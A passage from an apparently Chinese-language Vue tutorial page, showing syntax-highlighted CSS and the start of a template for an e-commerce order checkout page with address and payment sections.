</span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1.3</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">column</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-evenly</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.info</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.price</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.flow-num-box</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-end</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.money</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.pay-cell</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.red</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.pay-detail</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.pay-way</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.tit</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.pay-cell</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.van-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.buytips</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">textarea</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.footer-fixed</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding-left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#666</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">span</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.tipsbtn</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">121px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">linear-gradient</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">90deg</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">#f9211c</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">#ff6335</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h3 id="渲染-2"><a class="markdownIt-Anchor" href="#渲染-2"></a> 渲染</h3><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"订单结算台"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 地址相关 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"address"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left-icon"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"logistics"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info-content"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"name"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">{{ </span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4"> }} </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"mobile"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">{{ </span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">phone</span><span style="color: #D4D4D4"> }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info-address"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">regionName</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province</span><span style="color: #D4D4D4"> }} {{ </span><span style="color: #9CDCFE">regionName</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">regionName</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county</span><span style="color: #D4D4D4"> }} {{ </span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">还没有地址哦，点击右侧按钮添加吧</span><span style="color: 